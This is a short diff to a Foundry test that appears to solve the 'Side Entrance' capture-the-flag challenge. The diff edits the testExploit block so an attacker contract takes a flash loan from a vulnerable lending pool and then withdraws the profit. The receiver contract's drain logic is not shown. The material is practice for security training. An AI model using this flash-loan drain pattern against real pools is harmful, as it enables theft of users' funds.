@@ -37,10 +37,13 @@ contract SideEntrance is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.deal(address(attacker), ETHER_IN_POOL);
         vm.startPrank(attacker);
+        //sideEntranceLenderPool.deposit{value: ETHER_IN_POOL}();
+        //sideEntranceLenderPool.withdraw();
         flashLoanEtherReceiver = new FlashLoanEtherReceiver(address(sideEntranceLenderPool));
         flashLoanEtherReceiver.flashLoan(ETHER_IN_POOL);
-       // flashLoanEtherReceiver.withdraw();
+        flashLoanEtherReceiver.withdrawProfit();
         vm.stopPrank();
         /** EXPLOIT END **/
         validation();
